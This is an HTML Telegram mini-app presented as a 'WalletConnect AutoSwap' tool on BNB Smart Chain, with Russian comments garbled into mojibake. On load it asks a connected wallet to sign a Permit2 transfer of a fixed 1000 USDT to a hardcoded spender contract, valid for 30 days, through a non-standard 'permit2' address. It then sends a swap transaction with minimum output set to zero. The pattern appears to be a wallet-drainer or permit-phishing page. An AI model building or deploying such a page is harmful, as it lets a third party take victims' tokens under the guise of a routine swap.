<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>WalletConnect AutoSwap</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.7.0/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: #17212b;
      color: #fff;
      text-align: center;
      padding: 20px;
    }
    #qrcode {
      margin-top: 20px;
    }
    #status {
      margin-top: 20px;
      font-weight: 600;
      font-size: 16px;
      white-space: pre-line;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <h1>WalletConnect AutoSwap</h1>
  <canvas id="qrcode"></canvas>
  <div id="status">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>

  <script>
    Telegram.WebApp.ready();

    const CONFIG = {
      projectId: "d868f90cd734355ae0320f8f0258b6b1",
      chainId: "eip155:56",
      rpcUrl: "https://bsc-dataseed.binance.org",
      permit2: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
      autoswap: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
      tokenIn: "0x55D398326f99059FF775485246999027B3197955", // USDT
      tokenOut: "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f", // –ü—Ä–∏–º–µ—Ä
      amount: "1000000000000000000000", // 1000 USDT (18 decimals)
      deadlineSec: 30 * 24 * 60 * 60 // 30 –¥–Ω–µ–π
    };

    const status = document.getElementById("status");
    const qrCanvas = document.getElementById("qrcode");

    function setStatus(text, isError = false) {
      status.textContent = text;
      status.style.color = isError ? "#ff4d4d" : "#66bb6a";
    }

    async function runApp() {
      try {
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–ª–∏–µ–Ω—Ç–∞ WalletConnect
        setStatus("–°–æ–∑–¥–∞–Ω–∏–µ —Å–µ—Å—Å–∏–∏ WalletConnect...");
        const client = await window.SignClient.init({
          projectId: CONFIG.projectId,
          relayUrl: "wss://relay.walletconnect.com",
          metadata: {
            name: "AutoSwap WebApp",
            description: "Permit2 ‚Üí AutoSwap on BSC",
            url: window.location.href,
            icons: [],
          },
        });

        // –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–π —Å–µ—Å—Å–∏–∏
        setStatus("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...");
        const { uri, approval } = await client.connect({
          requiredNamespaces: {
            eip155: {
              methods: ["eth_sendTransaction", "eth_signTypedData_v4"],
              chains: [CONFIG.chainId],
              events: ["chainChanged", "accountsChanged"],
            },
          },
        });

        // –ü–æ–∫–∞–∑ QR-–∫–æ–¥–∞
        if (uri) {
          QRCode.toCanvas(qrCanvas, uri, { width: 220, margin: 1 }, err => {
            if (err) {
              setStatus("–û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ QR-–∫–æ–¥–∞", true);
              console.error(err);
            } else {
              setStatus("–°–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR –≤ Trust Wallet –∏–ª–∏ MetaMask");
            }
          });
        }

        // –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Å–µ—Å—Å–∏–∏
        setStatus("–û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞...");
        const session = await approval();
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ —Å–µ—Å—Å–∏–∏
        if (!session || !session.topic) {
          throw new Error("–ù–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–µ—Å—Å–∏—é");
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è –∞–∫–∫–∞—É–Ω—Ç–æ–≤
        const accounts = session.namespaces.eip155?.accounts;
        if (!accounts || accounts.length === 0) {
          throw new Error("–ù–µ –Ω–∞–π–¥–µ–Ω—ã –∞–∫–∫–∞—É–Ω—Ç—ã –≤ –∫–æ—à–µ–ª—å–∫–µ");
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–µ—Ç–∏
        const walletChainId = session.namespaces.eip155.chains[0];
        if (walletChainId !== CONFIG.chainId) {
          throw new Error(`–ù–µ–≤–µ—Ä–Ω–∞—è —Å–µ—Ç—å. –ü–µ—Ä–µ–∫–ª—é—á–∏—Ç–µ—Å—å –Ω–∞ BSC (ID: 56)`);
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞
        const address = accounts[0].split(":")[2];
        setStatus(`‚úÖ –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω:\n${address}`);

        // –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –ø–æ–¥–ø–∏—Å–∏ Permit2
        const now = Math.floor(Date.now() / 1000);
        const deadline = now + CONFIG.deadlineSec;
        const nonce = 0; // –§–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è

        const domain = {
          name: "Permit2",
          chainId: 56,
          verifyingContract: CONFIG.permit2
        };

        const types = {
          PermitTransferFrom: [
            { name: "permitted", type: "TokenPermissions" },
            { name: "spender", type: "address" },
            { name: "nonce", type: "uint256" },
            { name: "deadline", type: "uint256" }
          ],
          TokenPermissions: [
            { name: "token", type: "address" },
            { name: "amount", type: "uint256" }
          ]
        };

        const message = {
          permitted: {
            token: CONFIG.tokenIn,
            amount: CONFIG.amount
          },
          spender: CONFIG.autoswap,
          nonce: nonce,
          deadline: deadline
        };

        const typedData = {
          types,
          domain,
          primaryType: "PermitTransferFrom",
          message
        };

        // –ó–∞–ø—Ä–æ—Å –ø–æ–¥–ø–∏—Å–∏
        setStatus("–ó–∞–ø—Ä–æ—Å –ø–æ–¥–ø–∏—Å–∏ Permit2...");
        const signature = await client.request({
          topic: session.topic,
          chainId: CONFIG.chainId,
          request: {
            method: "eth_signTypedData_v4",
            params: [address, typedData] // –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–æ: –ø–µ—Ä–µ–¥–∞—á–∞ –æ–±—ä–µ–∫—Ç–∞ –≤–º–µ—Å—Ç–æ —Å—Ç—Ä–æ–∫–∏
          }
        });

        // –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
        setStatus("–§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...");
        const iface = new ethers.Interface([
          "function swapForUser(address user, address tokenIn, uint256 amount, uint256 nonce, uint256 deadline, address tokenOut, uint256 minOut, bytes signature)"
        ]);

        const calldata = iface.encodeFunctionData("swapForUser", [
          address,
          CONFIG.tokenIn,
          CONFIG.amount,
          nonce,
          deadline,
          CONFIG.tokenOut,
          0, // minOut = 0 –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
          signature
        ]);

        const tx = {
          from: address,
          to: CONFIG.autoswap,
          data: calldata
        };

        // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
        setStatus("–û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...");
        const txHash = await client.request({
          topic: session.topic,
          chainId: CONFIG.chainId,
          request: {
            method: "eth_sendTransaction",
            params: [tx]
          }
        });

        setStatus("üöÄ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!\n\n–•—ç—à —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:\n" + txHash);
      } catch (err) {
        console.error("–û—à–∏–±–∫–∞:", err);
        setStatus("–û—à–∏–±–∫–∞: " + (err.message || err), true);
      }
    }

    runApp();
  </script>
</body>
</html>
